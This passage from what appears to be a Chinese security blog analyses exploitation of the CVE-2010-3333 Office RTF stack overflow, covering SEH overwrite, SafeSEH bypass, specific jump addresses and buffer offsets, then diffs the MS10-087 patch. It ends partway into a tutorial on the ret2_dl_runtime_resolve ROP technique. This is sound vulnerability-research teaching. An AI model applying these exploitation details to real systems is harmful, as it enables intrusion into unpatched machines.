Exploit的通用性</h3><p>&emsp;&emsp;在前面通过<code>覆盖返回地址</code>劫持控制流的方法中，因为<code>XP&amp;Office2003</code>和<code>Win7&amp;Office2007</code>的环境下，<code>Office2003</code>和<code>Office2007</code>的<code>Word.exe</code>都是<code>未启用DEP</code>的，所以都可以通过<code>覆盖返回地址</code>，在<code>栈</code>上执行<code>Shellcode</code>。而在<code>Windows7</code>中是支持<code>映像ASLR</code>的，所以需要在<code>未启用ASLR</code>的模块中，寻找<code>“jmp esp”</code>形式的<code>ROPGadget</code>。如果可以找到在两种环境下<code>通用的ROPGadget</code>，就可以实现<code>Exploit的通用性</code>。</p><p>&emsp;&emsp;对于通过<code>覆盖SEH记录</code>劫持控制流的方法，我们需要关心的是<code>当前环境</code>是否启用<code>SafeSEH</code>和<code>SEHOP</code>。<code>Windows XP</code>是不支持<code>SEHOP</code>的，虽然<code>Windows7</code>支持<code>SEHOP</code>，但是其默认是<code>关闭</code>的。而<code>SafeSEH</code>在<code>Windows XP</code>和<code>Windows7</code>上都是支持的，所以我们需要<code>bypass SafeSEH</code>。这里使用的方法就是利用<code>未启用SafeSEH的模块</code>bypass SafeSEH，我们需要在<code>未启用SafeSEH的模块</code>中找到用于<code>SEH劫持</code>的<code>POP/POP/RET</code>形式的<code>ROPGadget</code>。如果模块<code>未启用SafeSEH</code>，并且该模块不是仅包含<code>中间语言</code>(IL,.Net编译)，这个异常处理就<code>可以被执行</code>。</p><p>&emsp;&emsp;在<code>XP&amp;Office2003</code>环境下，pFragments缓冲区起始地址为<code>0x001237dc</code>，栈底为<code>0x00130000</code>，0x00130000-0x001237dc=<code>0xc824</code>。在<code>Win7&amp;Office2007</code>的环境下，pFragments缓冲区起始地址为<code>0x0011fdf4</code>，栈底为<code>0x00130000</code>，0x00130000-0x0011fdf4=<code>0x1020c(关闭ASLR)</code>。<code>未关闭ASLR</code>的情况下，都是<code>大于0x10000</code>的。msf样本生成脚本中，使用的<code>复制数据长度</code>为<code>0xc8ac</code>，这也是为什么用msf生成的样本在<code>XP&amp;Office2003</code>环境下，<code>复制过程中</code>就会触发<code>内存访问异常</code>，而在<code>Win7&amp;Office2007</code>的环境下，<code>数据复制完成</code>后，对<code>已经覆盖的栈数据</code>进行访问时才触发<code>内存访问异常</code>。发生异常的原因，和<code>“覆盖返回地址”</code>节的一样，<code>sub_30F0B5C2</code>(Office2003)/<code>sub_32E5955E</code>(Office2007)的<code>第5个参数</code>未被修改为<code>0x0</code>，<code>sub_30F0B5C2</code>/<code>sub_32E5955E</code>返回前对<code>已覆盖的栈数据</code>进行访问，造成<code>异常</code>。</p><p>&emsp;&emsp;<code>“漏洞战争”</code>中，<code>泉哥</code>提供的思路是<code>Office2003</code>通过<code>覆盖返回地址</code>进行漏洞利用，被利用来<code>覆盖返回地址的地址</code>是<code>0x0026762f</code>，在<code>Office2003</code>下是<code>“call esp”</code>的地址，该地址适用于<code>Office2003 SP0-SP3</code>等各个子版本，属于稳定的跳转地址。而在<code>Office2007</code>中，<code>0x0026762f</code>已不再是call/jmp esp形式的指令，但是用此地址覆盖<code>Office2007</code>中<code>关键函数sub_32E5955E</code>的<code>返回地址</code>，会造成<code>异常</code>，继而转入<code>SEH异常处理程序</code>。我们只需要同时覆盖<code>Office2007</code>环境下栈中最近的<code>SEH记录</code>，就可以劫持SEH异常处理程序。</p><p><img src="/resources/2020/CVE-2010-3333/通用Exploit的栈布局.png" alt="通用Exploit的栈布局"></p><p>&emsp;&emsp;在<code>msf漏洞利用模块</code>中，<code>Targets</code>中有一个<code>“Automatic”</code>选项，其作用是将<code>多个环境</code>的<code>相关Target数据</code>糅合到<code>一个样本</code>中，达到<code>Exploit的通用性</code>。因为<code>msf漏洞利用模块</code>对于所有环境，使用的都是<code>覆盖SEH记录</code>进行漏洞利用，而不同环境下<code>SEH记录</code>距<code>缓冲区起始地址</code>的<code>Offset</code>各不相同，所以很少会出现<code>数据冲突</code>的情况。</p><h2 id="0x50-漏洞修复"><a href="#0x50-漏洞修复" class="headerlink" title="0x50 漏洞修复"></a>0x50 漏洞修复</h2><p><strong><code>环境：</code></strong>Win7&amp;Office2007</p><p>&emsp;&emsp;既然要分析<code>这个漏洞</code>官方是<code>怎么修复</code>的，首先要找到<code>此漏洞对应的补丁</code>。由于漏洞年代久远，<code>Microsoft的网站</code>又发生了很大的改变，<code>补丁的下载页面</code>已经找不到了，只找到如下<code>两个链接</code>：<br>1、<a href="https://docs.microsoft.com/zh-cn/security-updates/securitybulletins/2010/ms10-087" target="_blank" rel="noopener">Microsoft 安全公告 MS10-087 - 严重</a><br>2、<a href="https://support.microsoft.com/zh-cn/help/2423930/ms10-087-vulnerabilities-in-microsoft-office-could-allow-remote-code-e" target="_blank" rel="noopener">MS10-087：Microsoft Office 中的漏洞可能允许远程代码执行</a></p><p>&emsp;&emsp;虽然当时的<code>补丁公告页面</code>已经无法下载补丁了，但是我们可以通过官方提供的<a href="https://www.catalog.update.microsoft.com/" target="_blank" rel="noopener">补丁下载站</a>下载指定补丁。我们可以使用<code>KB编号</code>(Knowledge Base:知识库)进行搜索，或者使用此漏洞的<code>微软漏洞编号MS10-087</code>进行搜索就可以了。</p><p>&emsp;&emsp;我下载的是<code>Office2007</code>的补丁。我的分析环境中使用的是<code>Office2007</code>，未安装任何<code>Service Pack</code>包。如果<code>直接安装</code>这个补丁的话，会提示<code>下图所示错误</code>：</p><p><img src="/resources/2020/CVE-2010-3333/补丁安装错误.png" alt="补丁安装错误"></p><p>&emsp;&emsp;这里提示说有<code>两个原因</code>，<code>原因一</code>是升级修补程序可能更新的是不同版本的程序，也就是说，我们<code>安装的版本</code>与<code>补丁检测的版本</code>不匹配。<code>原因二</code>是升级修补程序不正确，也就是说<code>补丁安装程序损坏了</code>。经过思考，<code>第一种</code>的可能性大一点，我又查看了一下<code>此漏洞的公告</code>，公告中说此漏洞影响的是<code>Office2007SP2</code>版本，所以就想到可能是因为我没有安装<code>Office2007SP2升级包</code>。安装完<code>Office2007SP2升级包</code>，此漏洞的补丁就可以安装了。如下是<code>补丁安装前后</code>mso.dll的版本号：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1、SP2安装前：12.0.4518.1014</span><br><span class="line">2、SP2安装后：12.0.6425.1000</span><br><span class="line">3、补丁安装后：12.0.6545.5004</span><br></pre></td></tr></table></figure><p>&emsp;&emsp;我这里使用的是<code>“12.0.4518.1014”</code>和<code>“12.0.6545.5004”</code>进行对比。这里要吐槽一下<code>BinDiff</code>这个工具，分析实在是太慢了。第一次我是用的是<code>BinDiff4.3&amp;IDA Pro6.8</code>进行分析，结果我电脑开了一晚上也没分析完，<code>前一个漏洞</code>我也是用<code>此版本</code>来分析的，没出现<code>任何问题</code>。我看了一下<code>BinDiff的文档</code>，看到<code>BinDiff4.3</code>是基于<code>IDA SDK6.95</code>的，会不会是因为IDA的版本低了?又看到<code>BinDiff4.2</code>是基于<code>IDA SDK6.8</code>构建的，所以就想<code>BinDiff4.2&amp;IDA Pro6.8</code>的组合应该没问题了吧。开始尝试，经过<code>一段很长的时间</code>，我终于成功了。期间，我还试了<code>BinDiff5&amp;IDA Pro7.2</code>，并未成功，测试的原因是想看看<code>新版本</code>会不会<code>缩短比较的时间</code>。由于<code>此漏洞</code>涉及到的模块<code>mso.dll比较大</code>，生成的<code>idb</code>都在<code>200MB</code>左右，所以需要<code>较长时间</code>，请耐心等待。<code>BinDiff4.3&amp;IDA Pro6.8</code>失败的特征是，<code>BinDiff的进度条</code>一直在显示Diff中，但是<code>BinDiff的进程</code>却在生成<code>.BinDiff</code>文件后，占用<code>很少的CPU</code>，可以分析出<code>BinDiff</code>因为某些原因<code>卡住了</code>，但并未<code>提示错误</code>。</p><p>&emsp;&emsp;之前分析<code>漏洞原因</code>时，<code>关键漏洞函数</code>位于<code>“12.0.4518.1014”</code>版<code>mso.dll</code>的<code>sub_32E5955E</code>函数中，通过<code>函数名</code>，我们可以在<code>Matched Functions</code>中快速定位，找到之后，双击，就可以打开<code>“12.0.4518.1014”</code>版<code>mso.dll</code>的<code>sub_32E5955E</code>函数与<code>“12.0.6545.5004”</code>版<code>mso.dll</code>中的对应函数<code>sub_32E0239B</code>的<code>FlowGraphs</code>。通过对比<code>代码块</code>，我们可以快速定位到<code>添加补丁代码</code>的位置。下图是两个<code>函数代码块</code>的对比图：</p><div align="left"><img src="/resources/2020/CVE-2010-3333/补丁前后关键函数对比图.png" width="70%" height="50%" alt="补丁前后关键函数对比图"></div><p>&emsp;&emsp;我们在<code>IDA</code>中找到<code>多出来</code>的那部分<code>代码块</code>，对其进行<code>详细分析</code>。结果如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//补丁前关键函数关键代码</span></span><br><span class="line"><span class="keyword">char</span> __userpurge sub_32E5955E@&lt;al&gt;(<span class="keyword">int</span> a1@&lt;eax&gt;, <span class="keyword">int</span> a2, <span class="keyword">int</span> a3, <span class="keyword">int</span> a4, <span class="keyword">int</span> *a5, <span class="keyword">int</span> a6)</span><br><span class="line">&#123;</span><br><span class="line">    ......</span><br><span class="line">    <span class="keyword">if</span> ( a6 )</span><br><span class="line">    &#123;</span><br><span class="line">        v7 = *(_DWORD *)(sub_327A2549(*(_DWORD *)(a1 + <span class="number">8</span>)) + <span class="number">100</span>);</span><br><span class="line">        v17 = <span class="number">0</span>;</span><br><span class="line">        v8 = *(_DWORD *)v7;</span><br><span class="line">        v16 = <span class="number">83886080</span>;</span><br><span class="line">        (*(<span class="keyword">void</span> (__stdcall **)(<span class="keyword">int</span>, <span class="keyword">int</span> *, <span class="keyword">int</span>))(v8 + <span class="number">28</span>))(v7, &amp;v15, a3);</span><br><span class="line">        result = sub_32E5941B(v15, a2, a5 != <span class="number">0</span> ? (<span class="keyword">unsigned</span> <span class="keyword">int</span>)&amp;v17 : <span class="number">0</span>, a6);</span><br><span class="line">        <span class="keyword">if</span> ( result )</span><br><span class="line">        &#123;</span><br><span class="line">            ......</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        sub_32E6AEA8(<span class="number">863334498</span>);</span><br><span class="line">        result = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//补丁后关键函数关键代码</span></span><br><span class="line"><span class="keyword">char</span> __userpurge sub_32E0239B@&lt;al&gt;(<span class="keyword">int</span> a1@&lt;eax&gt;, <span class="keyword">int</span> a2, <span class="keyword">int</span> a3, <span class="keyword">int</span> a4, <span class="keyword">int</span> *a5, <span class="keyword">int</span> a6)</span><br><span class="line">&#123;</span><br><span class="line">    ......</span><br><span class="line">    <span class="keyword">if</span> ( a6 )</span><br><span class="line">    &#123;</span><br><span class="line">        v7 = *(_DWORD *)(sub_327DAFBD(*(_DWORD *)(a1 + <span class="number">8</span>)) + <span class="number">100</span>);<span class="comment">// v7为关键对象首地址</span></span><br><span class="line">        v16 = <span class="number">0</span>;</span><br><span class="line">        v15 = <span class="number">83886080</span>;</span><br><span class="line">        <span class="comment">// 这些条件则为补丁代码</span></span><br><span class="line">        <span class="keyword">if</span> ( v7                                     <span class="comment">// 关键对象首地址不为0</span></span><br><span class="line">            &amp;&amp; (<span class="keyword">unsigned</span> <span class="keyword">int</span>)(*(<span class="keyword">int</span> (__stdcall **)(<span class="keyword">int</span>))(*(_DWORD *)v7 + <span class="number">48</span>))(v7) &lt;= <span class="number">4</span><span class="comment">// 复制数据长度不能大于4</span></span><br><span class="line">            &amp;&amp; (*(<span class="keyword">int</span> (__stdcall **)(<span class="keyword">int</span>))(*(_DWORD *)v7 + <span class="number">44</span>))(v7) &gt; a4<span class="comment">// 关键对象第一个成员变量&gt;a4</span></span><br><span class="line">            &amp;&amp; (*(<span class="keyword">int</span> (__stdcall **)(<span class="keyword">int</span>))(*(_DWORD *)v7 + <span class="number">44</span>))(v7) &gt; a3<span class="comment">// 关键对象第一个成员变量&gt;a3</span></span><br><span class="line">            &amp;&amp; a3 &gt;= <span class="number">0</span></span><br><span class="line">            &amp;&amp; a4 &gt;= <span class="number">0</span></span><br><span class="line">            <span class="comment">// 将pFragments属性数据复制到栈上的虚函数</span></span><br><span class="line">            &amp;&amp; ((*(<span class="keyword">void</span> (__stdcall **)(<span class="keyword">int</span>, <span class="keyword">int</span> *, <span class="keyword">int</span>))(*(_DWORD *)v7 + <span class="number">28</span>))(v7, &amp;v14, a3),</span><br><span class="line">            (<span class="keyword">unsigned</span> __int8)sub_32E02258(v14, a2, a5 != <span class="number">0</span> ? (<span class="keyword">unsigned</span> <span class="keyword">int</span>)&amp;v16 : <span class="number">0</span>, a6)) )</span><br><span class="line">        &#123;</span><br><span class="line">            ......</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            result = <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        sub_32E197A4(<span class="number">863334498</span>);</span><br><span class="line">        result = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>&emsp;&emsp;可以看到<code>补丁</code>后的<code>关键函数</code>中只有满足了那个<code>关键if</code>中的<code>很多条件</code>才能执行到将<code>pFragments属性数据</code>复制到<code>栈上</code>的<code>虚函数</code>。因为涉及到了<code>很多虚函数</code>，只是<code>静态分析</code>是不行的，所以要结合<code>动态调试</code>确定<code>虚函数的地址</code>，进而分析<code>虚函数的功能</code>。功能我已经分析完，写在了上面<code>代码的注释</code>中。其中<code>第一个条件</code>就是判断<code>pFragments属性数据长度</code>的。如果pFragments属性数据<code>大于4字节</code>，则不再执行<code>内存复制</code>，直接返回，从而解决了此漏洞。</p><h2 id="0x60-Reference"><a href="#0x60-Reference" class="headerlink" title="0x60 Reference"></a>0x60 Reference</h2><blockquote><ul><li>1.漏洞战争:软件漏洞分析精要 2.4 CVE-2010-3333 Microsoft RTF栈溢出漏洞</li><li>2.0day安全:软件漏洞分析技术 第3章、第6章、第2篇</li><li>3.加密与解密(第4版) 第8章 Windows下的异常处理</li><li>4.精通Metasploit渗透测试(第2版) 第3章 渗透模块的开发过程</li><li>5.Metasploit渗透测试魔鬼训练营 6.6 针对Office软件的渗透攻击案例——MS10-087安全漏洞</li><li>6.<a href="https://web.archive.org/web/20190708132914/http://www.kleinlercher.at/tools/Windows_Protocols/Word2007RTFSpec9.pdf" target="_blank" rel="noopener">Rich Text Format (RTF) Specification Version 1.9.1</a></li><li>7.<a href="https://www.fireeye.com/blog/threat-research/2016/05/how_rtf_malware_evad.html" target="_blank" rel="noopener">How RTF malware evades static signature-based detection</a></li></ul></blockquote>]]></content>
      
      <categories>
          
          <category> CVE </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Stack Overflow </tag>
            
            <tag> Windows </tag>
            
            <tag> Microsoft Office </tag>
            
            <tag> Rtf </tag>
            
            <tag> FileFormat </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>ret2_dl_runtime_resolve详解</title>
      <link href="/2020/08/15/ret2_dl_runtime_resolve%E8%AF%A6%E8%A7%A3/"/>
      <url>/2020/08/15/ret2_dl_runtime_resolve%E8%AF%A6%E8%A7%A3/</url>
      <content type="html"><![CDATA[<blockquote><p>一种高级的ROP漏洞利用技术。<br>要想弄懂这个ROP利用技巧，需要首先理解ELF文件的基本结构，以及动态链接的基本过程。<br>glibc源码看的想吐。<br>&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;——当你的才华还配不上你的野心时，请静下来好好努力！<br><a id="more"></a></p></blockquote><h2 id="1、延迟绑定"><a href="#1、延迟绑定" class="headerlink" title="1、延迟绑定"></a>1、延迟绑定</h2><p>&emsp;&emsp;<code>动态链接</code>的确有很多优势，比<code>静态链接</code>要灵活得多，但它是以牺牲<code>一部分性能</code>为代价的。据统计ELF程序在<code>静态链接</code>下要比<code>动态库</code>稍微快点，大约为1%～5%，当然这取决于<code>程序本身的特性</code>及<code>运行环境</code>等。我们知道动态链接比静态链接慢的<strong><code>主要原因</code></strong>是动态链接下对于<code>全局和静态的数据</code>访问都要进行复杂的<code>GOT定位</code>，然后<code>间接寻址</code>；对于<code>模块间的调用</code>也要先<code>定位GOT</code>，然后再进行<code>间接跳转</code>，如此一来，程序的运行速度必定会减慢。<strong><code>另外一个减慢运行速度的原因</code></strong>是动态链接的<code>链接工作</code>在<code>运行时</code>完成，即程序开始执行时，动态链接器都要进行一次链接工作，正如我们上面提到的，<code>动态链接器</code>会寻找并装载所需要的<code>共享对象</code>，然后进行<code>符号查找地址重定位</code>等工作，这些工作势必减慢程序的<code>启动速度</code>。这是影响动态链接性能的<strong><code>两个主要问题</code></strong>，我们将在这一节介绍优化动态链接性能的一些方法。[<a href="#Ref1">1</a>]</p><h3 id="1-1、延迟绑定的实现"><a href="#1-1、延迟绑定的实现" class="headerlink" title="1.1、延迟绑定的实现"></a>1.1、延迟绑定的实现</h3><h4 id="1-1-1、PLT的基本原理"><a href="#1-1-1、PLT的基本原理" class="headerlink" title="1.1.1、PLT的基本原理"></a>1.1.1、PLT的基本原理</h4><p>&emsp;&emsp;在<code>动态链接</code>下，程序模块之间包含了大量的<code>函数引用</code>（<code>全局变量</code>往往比较少，因为大量的全局变量会导致<code>模块之间耦合度</code>变大），所以在<code>程序开始执行前</code>，动态链接会耗费不少时间用于解决模块之间的<code>函数引用</code>的<code>符号查找</code>以及<code>重定位</code>，这也是我们上面提到的减慢动态链接性能的<strong><code>第二个原因</code></strong>。不过可以想象，在一个程序运行过程中，可能<code>很多函数在程序执行完时都不会被用到</code>，比如一些错误处理函数或者是一些用户很少用到的功能模块等，如果一开始就把所有函数都链接好实际上是一种浪费。所以ELF采用了一种叫做<strong><code>延迟绑定(Lazy Binding)</code></strong>的做法，<code>基本的思想</code>就是当函数<code>第一次被用到时</code>才进行绑定（符号查找、重定位等），如果<code>没有用到</code>则不进行绑定。所以程序开始执行时，模块间的函数调用都没有进行绑定，而是需要用到时才由<code>动态链接器</code>来负责绑定。这样的做法可以大大<code>加快</code>程序的<code>启动速度</code>，特别有利于一些有<code>大量函数引用</code>和<code>大量模块</code>的程序。[<a href="#Ref1">1</a>]</p><p>&emsp;&emsp;ELF使用<strong><code>PLT(Procedure Linkage Table)</code></strong>的方法来实现，这种方法使用了一些很精巧的指令序列来完成。在开始详细介绍PLT之前，我们先从<code>动态链接器的角度</code>设想一下：假设<code>liba.so</code>需要调用<code>libc.so</code>中的<code>bar()</code>函数，那么当<code>liba.so</code>中<code>第一次</code>调用<code>bar()</code>时，这时候就需要调用<code>动态链接器</code>中的<code>某个函数</code>来完成<code>地址绑定</code>工作，我们假设这个函数叫做<code>lookup()</code>，那么lookup()需要知道<code>哪些必要的信息</code>才能完成这个函数地址绑定工作呢？我想答案很明显，lookup()至少需要知道这个地址绑定发生在<code>哪个模块</code>，<code>哪个函数</code>？那么我们可以假设lookup的原型为<code>lookup(module, function)</code>，这两个参数的值在我们这个例子中分别为<code>liba.so</code>和<code>bar()</code>。在<code>Glibc</code>中，我们这里的<code>lookup()</code>函数真正的名字叫<strong><code>_dl_runtime_resolve()</code></strong>。[<a href="#Ref1">1</a>]</p><p>&emsp;&emsp;当我们调用某个<code>外部模块</code>的函数时，如果按照通常的做法应该是通过<code>GOT中相应的项</code>进行<code>间接跳转</code>。<strong><code>PLT</code></strong>为了实现<code>延迟绑定</code>，在这个过程中间又<code>增加了一层间接跳转</code>。<code>调用函数</code>并不直接通过<code>GOT</code>跳转，而是通过一个叫作<strong><code>PLT项</code></strong>的结构来进行跳转。<code>每个外部函数</code>在<code>PLT</code>中都有一个<code>相应的项</code>，比如<code>bar()</code>函数在<code>PLT</code>中的项的地址我们称之为<code>bar@plt</code>。让我们来看看bar@plt的实现：[<a href="#Ref1">1</a>]<br><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">bar@plt:</span></span><br><span class="line"><span class="keyword">jmp</span> *(bar@GOT)              <span class="comment">;*(bar@GOT)为bar()在GOT表中相应项的地址</span></span><br><span class="line"><span class="keyword">push</span> n                      <span class="comment">;bar()在重定位表“.rel.plt”相应项的下标</span></span><br><span class="line"><span class="keyword">push</span> moduleID               <span class="comment">;GOT[1],bar()所在共享库的moduleID</span></span><br><span class="line">jump _dl_runtime_resolve    <span class="comment">;GOT[2],动态链接器的_dl_runtime_resolve()函数</span></span><br></pre></td></tr></table></figure></p><p>&emsp;&emsp;<code>bar@plt</code>的<strong><code>第一条指令</code></strong>是一条通过GOT间接跳转的指令。<code>bar@GOT</code>表示GOT中保存bar()这个函数相应的项。如果链接器在<code>初始化阶段</code>已经<code>初始化该项</code>，并且将<code>bar()的地址</code>填入该项，那么这个跳转指令的结果就是我们所期望的，跳转到bar()，实现函数正确调用。但是为了<code>实现延迟绑定</code>，链接器在<code>初始化阶段</code>并没有将<code>bar()的地址</code>填入到该项，而是将上面代码中<code>第二条指令“push n”的地址</code>填入到<code>bar@GOT</code>中，这个步骤<code>不需要</code>查找任何符号，所以<code>代价很低</code>。很明显，第一条指令的效果是跳转到第二条指令，相当于没有进行任何操作。<strong><code>第二条指令</code></strong>将一个<code>数字n</code>压入堆栈中，这个数字是<code>bar</code>这个符号引用在<code>重定位表“.rel.plt”</code>中的<code>下标</code>。接着<strong><code>又是一条push指令</code></strong>将<code>模块的ID</code>压入到堆栈，然后跳转到<strong><code>_dl_runtime_resolve</code></strong>。这实际上就是在实现我们前面提到的<code>lookup(module, function)</code>这个函数的<code>调用</code>：先将所需要决议符号的下标压入堆栈，再将模块ID压入堆栈，然后调用动态链接器的<code>_dl_runtime_resolve()</code>函数来完成<code>符号解析</code>和<code>重定位</code>工作。<code>_dl_runtime_resolve()</code>在进行一系列工作以后将<code>bar()的真正地址</code>填入到<code>bar@GOT</code>中。[<a href="#Ref1">1</a>]</p><p>&emsp;&emsp;一旦<code>bar()</code>这个函数被<strong><code>解析完毕</code></strong>，当我们<code>再次调用</code>bar@plt时，<code>第一条jmp指令</code>就能够跳转到<code>真正的bar()函数</code>中，<code>bar()函数返回</code>的时候会根据<code>堆栈里面保存的EIP</code>直接<code>返回到调用者</code>，而不会再继续执行bar@plt中<code>第二条指令开始的那段代码</code>，那段代码只会在<code>符号未被解析时</code>执行一次。[<a href="#Ref1">1</a>]</p><h4 id="1-1-2、PLT的真正实现"><a href="#1-1-2、PLT的真正实现" class="headerlink" title="1.1.2、PLT的真正实现"></a>1.1.2、PLT的真正实现</h4><p>&emsp;&emsp;上面我们描述的是<strong><code>PLT的基本原理</code></strong>，<code>PLT真正的实现</code>要比它的结构稍微复杂一些。ELF将<code>GOT</code>拆分成了两个表叫做<strong><code>“.got”</code></strong>和<strong><code>“.got.plt”</code></strong>。其中<strong><code>“.got”</code></strong>用来保存<code>全局变量引用</code>的地址，<strong><code>“.got.plt”</code></strong>用来保存<code>函数引用</code>的地址，也就是说，所有对于外部函数的引用全部被分离出来放到了“.got.plt”中。另外<strong><code>“.got.plt”</code></strong>还有一个特殊的地方是它的<code>前三项</code>是有<code>特殊意义</code>的，分别含义如下：[<a href="#Ref1">1</a>]<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">第一项GOT[0]：保存的是“.dynamic”段的地址，这个段描述了本模块动态链接相关的信息，我们在后面还会介绍“.dynamic”段。</span><br><span class="line">第二项GOT[1]：保存的是本模块的ID。link_map结构的地址，动态链接器利用该地址来对符号进行解析。</span><br><span class="line">第三项GOT[2]：保存的是_dl_runtime_resolve()的地址。</span><br></pre></td></tr></table></figure></p><p>&emsp;&emsp;其中<strong><code>第二项</code></strong>和<strong><code>第三项</code></strong>由<code>动态链接器</code>在<code>装载共享模块</code>的时候负责将它们<code>初始化</code>。<strong><code>“.got.plt”</code></strong>的<code>其余项</code>分别对应<code>每个外部函数的引用</code>。PLT的结构也与我们示例中的PLT稍有不同，为了减少代码的重复，ELF把上面例子中的<code>最后两条指令</code>放到<code>PLT</code>中的<strong><code>第一项</code></strong>。并且规定<code>每一项的长度是16个字节</code>，刚好用来存放<code>3条指令</code>，<strong><code>实际的PLT基本结构</code></strong>如图所示：[<a href="#Ref1">1</a>]</p><div align="left"><img src="/resources/2020/实际的PLT基本结构.png" width="50%" height="50%" alt="实际的PLT基本结构"></div><p>实际的<code>PLT基本结构代码</code>如下：<br><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">PLT0:</span></span><br><span class="line"><span class="keyword">push</span> *(GOT + <span class="number">4</span>)     <span class="comment">;GOT[1],bar()所在共享库的moduleID,link_map结构的地址</span></span><br><span class="line">jump *(GOT + <span class="number">8</span>)     <span class="comment">;GOT[2],动态链接器的_dl_runtime_resolve()函数的地址</span></span><br><span class="line">......</span><br><span class="line"><span class="symbol">bar@plt:</span></span><br><span class="line"><span class="keyword">jmp</span> *(bar@GOT)      <span class="comment">;*(bar@GOT)为bar()在GOT表中相应项的地址</span></span><br><span class="line"><span class="keyword">push</span> n              <span class="comment">;bar()在重定位表“.rel.plt”相应项的下标</span></span><br><span class="line">jump PLT0</span><br></pre></td></tr></table></figure></p><p>&emsp;&emsp;<code>PLT</code>在ELF文件中以<code>独立的段</code>存放，段名通常叫做<strong><code>“.plt”</code></strong>，因为它本身是一些<code>地址无关的代码</code>，所以可以跟<code>代码段</code>等一起合并成同一个<code>可读可执行</code>的“Segment”被装载入内存。[<a href="#Ref1">1</a>]</p><h2 id="2、动态链接相关结构"><a href="#2、动态链接相关结构" class="headerlink" title="2、动态链接相关结构"></a>2、动态链接相关结构</h2><p>&emsp;&emsp;<code>动态链接</code>在<code>不同的系统</code>上有不同的实现方式，<code>ELF</code>的动态链接实现方式比<code>PE</code>稍微简单一点。<code>动态链接</code>的<code>可执行文件的装载</code>与<code>静态链接</code>情况基本一样。首先<code>操作系统</code>会读取<code>可执行文件的头部</code>，检查<code>文件的合法性</code>，然后从头部中的<code>“Program Header”</code>中读取每个<code>“Segment”</code>的<code>虚拟地址</code>、<code>文件地址</code>和<code>属性</code>，并将它们映射到<code>进程虚拟空间</code>的相应位置，这些步骤跟前面的静态链接情况下的装载基本无异。</p><p>&emsp;&emsp;在<strong><code>静态链接</code></strong>情况下，<code>操作系统</code>接着就<code>可以</code>把<code>控制权</code>转交给<code>可执行文件的入口地址</code>，然后程序开始执行，一切看起来非常直观。</p><p>&emsp;&emsp;在<strong><code>动态链接</code></strong>情况下，<code>操作系统</code>还<code>不能</code>在<code>装载完可执行文件</code>之后就把<code>控制权</code>交给<code>可执行文件</code>，因为我们知道<code>可执行文件</code>依赖于很多<code>共享对象</code>。这时候，可执行文件里对于很多<code>外部符号的引用</code>还处于<code>无效地址</code>的状态，即还没有跟<code>相应的共享对象</code>中的<code>实际位置</code>链接起来。所以在映射完可执行文件之后，操作系统会先启动一个<strong><code>动态链接器(Dynamic 